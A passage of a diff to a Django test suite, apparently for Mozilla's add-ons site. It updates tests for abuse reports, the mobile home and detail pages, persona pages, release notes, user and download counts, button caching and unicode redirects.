+        assert 'spammy' in mail.outbox[0].body
+        report = AbuseReport.objects.get(addon=3615)
+        eq_(report.message, 'spammy')
+        eq_(report.reporter.email, 'regular@mozilla.com')
 
     def test_abuse_name(self):
         addon = Addon.objects.get(pk=3615)
@@ -1216,10 +1403,11 @@ class TestReportAbuse(AbuseBase, test_utils.TestCase):
         self.client.login(username='regular@mozilla.com', password='password')
         self.client.post(self.full_page, {'text': 'spammy'})
         assert 'spammy' in mail.outbox[0].body
+        assert AbuseReport.objects.get(addon=addon)
 
     def test_abuse_persona(self):
-        addon_url = reverse('addons.detail', args=['a15663'])
-        r = self.client.get(addon_url)
+        shared_url = reverse('addons.detail', args=['a15663'])
+        r = self.client.get(shared_url)
         doc = pq(r.content)
         assert doc("fieldset.abuse")
 
@@ -1227,69 +1415,119 @@ class TestReportAbuse(AbuseBase, test_utils.TestCase):
         self.client.login(username='regular@mozilla.com', password='password')
         r = self.client.post(reverse('addons.abuse', args=['a15663']),
                              {'text': 'spammy'})
-        self.assertRedirects(r, addon_url)
+        self.assertRedirects(r, shared_url)
         eq_(len(mail.outbox), 1)
         assert 'spammy' in mail.outbox[0].body
+        assert AbuseReport.objects.get(addon=15663)
 
 
-class TestMobile(test_utils.TestCase):
-    fixtures = ['addons/featured', 'base/apps', 'base/addon_3615',
-                'base/featured', 'bandwagon/featured_collections']
-
-    def setUp(self):
-        self.client.cookies['mamo'] = 'on'
-        self.client.defaults['SERVER_NAME'] = settings.MOBILE_DOMAIN
+class TestMobile(amo.tests.MobileTest, amo.tests.TestCase):
+    fixtures = ['addons/featured', 'base/apps', 'base/users',
+                'base/addon_3615', 'base/featured',
+                'bandwagon/featured_collections']
 
 
 class TestMobileHome(TestMobile):
 
-    def _test_addons(self):
+    def test_addons(self):
+        # Uncomment when redis gets fixed in CI.
+        raise SkipTest
+
         r = self.client.get('/', follow=True)
         eq_(r.status_code, 200)
         app, lang = r.context['APP'], r.context['LANG']
         featured, popular = r.context['featured'], r.context['popular']
-        eq_(len(featured), 6)
+        eq_(len(featured), 3)
         assert all(a.is_featured(app, lang) for a in featured)
         eq_(len(popular), 3)
         eq_([a.id for a in popular],
             [a.id for a in sorted(popular, key=lambda x: x.average_daily_users,
                                   reverse=True)])
 
-    @patch.object(settings, 'NEW_FEATURES', False)
-    def test_addons(self):
-        self._test_addons()
 
-    @patch.object(settings, 'NEW_FEATURES', True)
-    def test_new_addons(self):
-        self._test_addons()
+class TestMobileDetails(TestPersonas, TestMobile):
+    fixtures = TestMobile.fixtures + ['base/featured', 'base/users']
 
-
-class TestMobileDetails(TestMobile):
-    fixtures = TestMobile.fixtures + ['base/featured']
+    def setUp(self):
+        super(TestMobileDetails, self).setUp()
+        self.ext = Addon.objects.get(id=3615)
+        self.url = reverse('addons.detail', args=[self.ext.slug])
+        self.persona = Addon.objects.get(id=15679)
+        self.persona_url = self.persona.get_url_path()
+        self.create_switch('personas-migration-completed')
+        self.create_addon_user(self.persona)
 
     def test_extension(self):
-        r = self.client.get(reverse('addons.detail', args=['a3615']))
+        r = self.client.get(self.url)
         eq_(r.status_code, 200)
         self.assertTemplateUsed(r, 'addons/mobile/details.html')
 
     def test_persona(self):
-        addon = Addon.objects.get(id=15679)
-        r = self.client.get(addon.get_url_path())
+        r = self.client.get(self.persona_url, follow=True)
         eq_(r.status_code, 200)
         self.assertTemplateUsed(r, 'addons/mobile/persona_detail.html')
         assert 'review_form' not in r.context
         assert 'reviews' not in r.context
         assert 'get_replies' not in r.context
 
+    def test_more_personas(self):
+        other = addon_factory(type=amo.ADDON_PERSONA)
+        self.create_addon_user(other)
+        r = self.client.get(self.persona_url, follow=True)
+        eq_(pq(r.content)('#more-artist .more-link').length, 1)
+
+    def test_new_more_personas(self):
+        other = addon_factory(type=amo.ADDON_PERSONA)
+        self.create_addon_user(other)
+        self.persona.persona.persona_id = 0
+        self.persona.persona.save()
+        r = self.client.get(self.persona_url, follow=True)
+        profile = UserProfile.objects.get(id=999).get_url_path()
+        eq_(pq(r.content)('#more-artist .more-link').attr('href'),
+            profile + '?src=addon-detail')
+
     def test_persona_mobile_url(self):
         r = self.client.get('/en-US/mobile/addon/15679/')
         eq_(r.status_code, 200)
 
-    def test_release_notes(self):
-        a = Addon.objects.get(id=3615)
-        r = self.client.get(reverse('addons.detail', args=['a3615']))
+    def test_extension_release_notes(self):
+        r = self.client.get(self.url)
         relnotes = pq(r.content)('.versions li:first-child > a')
-        eq_(relnotes.text(), '%s (Release Notes)' % a.current_version.version)
-
-        self.client.get(relnotes.attr('href'), follow=True)
+        assert relnotes.text().startswith(self.ext.current_version.version), (
+            'Version number missing')
+        version_url = self.ext.current_version.get_url_path()
+        eq_(relnotes.attr('href'), version_url)
+        self.client.get(version_url, follow=True)
         eq_(r.status_code, 200)
+
+    def test_extension_adu(self):
+        doc = pq(self.client.get(self.url).content)('table')
+        eq_(doc('.adu td').text(), numberfmt(self.ext.average_daily_users))
+        self.ext.update(average_daily_users=0)
+        doc = pq(self.client.get(self.url).content)('table')
+        eq_(doc('.adu').length, 0)
+
+    def test_extension_downloads(self):
+        doc = pq(self.client.get(self.url).content)('table')
+        eq_(doc('.downloads td').text(), numberfmt(self.ext.weekly_downloads))
+        self.ext.update(weekly_downloads=0)
+        doc = pq(self.client.get(self.url).content)('table')
+        eq_(doc('.downloads').length, 0)
+
+    def test_button_caching(self):
+        """The button popups should be cached for a long time."""
+        # Get the url from a real page so it includes the build id.
+        client = test.Client()
+        doc = pq(client.get('/', follow=True).content)
+        js_url = absolutify(reverse('addons.buttons.js'))
+        url_with_build = doc('script[src^="%s"]' % js_url).attr('src')
+
+        response = client.get(url_with_build, follow=True)
+        fmt = '%a, %d %b %Y %H:%M:%S GMT'
+        expires = datetime.strptime(response['Expires'], fmt)
+        assert (expires - datetime.now()).days >= 365
+
+    def test_unicode_redirect(self):
+        url = '/en-US/firefox/addon/2848?xx=\xc2\xbcwhscheck\xc2\xbe'
+        response = test.Client().get(url)
+        eq_(response.status_code, 301)
